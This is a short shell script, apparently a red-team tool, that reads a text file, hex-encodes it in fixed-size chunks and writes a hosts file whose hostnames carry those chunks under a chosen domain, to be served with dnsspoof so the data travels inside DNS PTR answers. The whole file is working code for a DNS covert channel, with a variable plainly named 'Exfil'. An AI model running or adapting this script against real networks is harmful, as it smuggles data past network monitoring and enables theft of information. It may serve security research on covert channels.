 #!/bin/sh
# syntax0 : ./DnsHostCreator.sh SourceTextFile.txt DomainName ChunkNumber
# syntax0 : ./DnsHostCreator.sh text.txt Test.com 20 > myhost.txt
# Example : dnsspoof -f myhost.txt
echo "DnsHostCreator.sh v1.0 , Published by Damon Mohammadbagher 2017-2018" 
echo "Injecting DATA to DNS Traffic via DNS PTR Records and Host.txt"
echo ""
cu=0
for op in `xxd -p -c $3 $1`; do
((cu++))
done
((cu++))
echo 192.168.1.$cu "temp.$2" 
x=0
for ops in `xxd -p -c $3 $1`; do
 Exfil=$ops
 t=`echo $Exfil | xxd -r -p`
 echo "# injecting this text via this host.domain: " $t " ==> " $Exfil.$2
 echo 192.168.1.$x "$Exfil.$2" 
((x++))
done

